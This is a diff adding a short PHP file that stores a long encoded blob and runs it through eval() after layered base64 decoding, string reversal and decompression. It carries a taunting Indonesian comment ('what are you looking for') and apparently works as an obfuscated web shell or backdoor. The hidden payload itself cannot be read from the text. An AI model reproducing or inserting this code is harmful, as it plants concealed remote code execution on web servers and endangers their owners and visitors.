@@ -1,0 +1,5 @@
+<?php
+//cari apa wey
+$enc = '==QotB9Q7RotiHQ3dGSuhMsRBa6QhzDy1XHX7YDh6rvb+PUdPcrIqTNFGenMp3eCNj/nLx3EVaZvW/Fl3fEWqPGhmodc9WzqX0C2kE6FCra2y77E4yvgI64gtZ8NhGaqBv+0ObUGlgBNBVYz1KA1yuKnDx5xLgWENOGGbGXOtJhvzL1uVCVsMgbbn0ExcjcNdCi+cLbXWJ84xSspB7xJBwEFqoI2g53gzYCpZ2wwZmbzZXI1o2qUv9Lp0R42FRbdSoydBwPRu8YrELVhmSBMD7vCXXEEwIsCLHZlci3/oAw1BwJe/3BAiHw/YAw5B8/EAweA';
+eval(base64_decode(base64_decode('WlhaaGJDZ2lQejRpTG1kNmRXNWpiMjF3Y21WemN5aG5lblZ1WTI5dGNISmxjM01vWjNwcGJtWnNZWFJsS0dkNmFXNW1iR0YwWlNobmVtbHVabXhoZEdVb1ltRnpaVFkwWDJSbFkyOWtaU2h6ZEhKeVpYWW9KR1Z1WXlrcEtTa3BLU2twT3c9PQ=========')));exit;
+?>
